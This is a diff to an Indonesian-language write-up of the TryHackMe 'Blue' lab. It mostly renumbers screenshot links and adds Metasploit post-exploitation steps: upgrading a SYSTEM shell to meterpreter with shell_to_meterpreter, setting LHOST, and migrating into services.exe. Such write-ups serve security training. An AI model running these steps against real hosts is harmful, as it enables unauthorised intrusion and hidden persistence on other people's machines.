@@ -77,20 +77,40 @@ Nmap done: 1 IP address (1 host up) scanned in 145.80 seconds
 
 - Proses exploitasi berhasil dan kita masuk sebagai **nt authority\system**
 
-![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%206.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%207.JPG)
 
 - Tekan **Ctrl+Z** lalu ketik "y" untuk mengubah session 1 ke background
 
-![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%207.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%208.JPG)
 
 - Cari modul untuk mengkonversi shell sistem ke shell meterpreter di metasploit. Kita bisa gunakan perintah `search shell_to_meterpreter`
 
-![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%208.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%209.JPG)
 
 - Karena hanya ada 1 modul, langsung kita gunakan modul tersebut dengan perintah `use 0`
 
-![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%209.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2010.JPG)
 
 - Ketik `show options` untuk melihat daftar parameter yang perlu diisi pada modul tersebut
 
-![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2010.JPG)
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2011.JPG)
+
+- Gunakan perintah `set <Nama parameter> <Value>` untuk mengisi parameter. Isi parameter LHOST dengan IP tun0 pada komputer yang anda gunakan dan parameter SESSION dengan 1
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2012.JPG)
+
+- Ketik `exploit` untuk memulai proses exploitasi. Proses exploitasi berhasil dan ketikkan `sessions` untuk melihat daftar session yang berhasil terbentuk
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2013.JPG)
+
+- Masuk ke session 2 dengan perintah `sessions -i <nomor session>`
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2014.JPG)
+
+- Ketik `ps` untuk melihat daftar proses yang berjalan di server sesuai arahan tugas. Disini ditemukan program services.exe yang berjalan di PID 672
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2015.JPG)
+
+- Lakukan migrate dengan perintah `migrate <PID>`
+
+![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/Blue/assets/b%2016.JPG)
